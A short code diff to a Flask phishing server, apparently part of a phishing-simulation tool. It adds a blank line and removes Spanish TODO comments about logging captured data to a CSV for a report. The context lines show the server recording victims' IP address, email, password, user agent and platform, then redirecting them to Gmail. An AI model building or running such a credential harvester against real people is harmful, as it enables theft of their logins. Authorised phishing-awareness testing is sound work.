@@ -8,6 +8,7 @@ app = Flask(__name__)
 
 FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date']
 
+
 @app.route('/', methods=['GET', 'POST'])
 def phishing_server():
     target = sys.argv[1]
@@ -24,11 +25,6 @@ def phishing_server():
                 'date': datetime.now().strftime('%H:%m %d-%m-%Y')
             })
         return redirect("https://www.gmail.com", code=302)
-        # TODO: todos estos cmapos se vana  meter en un CSV.
-        # este CSV va a contener ip, email, passw, navegador....
-        # además una fase o stage, por ejemplo si se ha llegado hasta aqí es que el se ha saltado
-        # varias protecciones... pues eso también hay que pònerlo para cuando se genere el informe.
-        # redirect a donde toque
     return render_template(target, name='index')
 
 
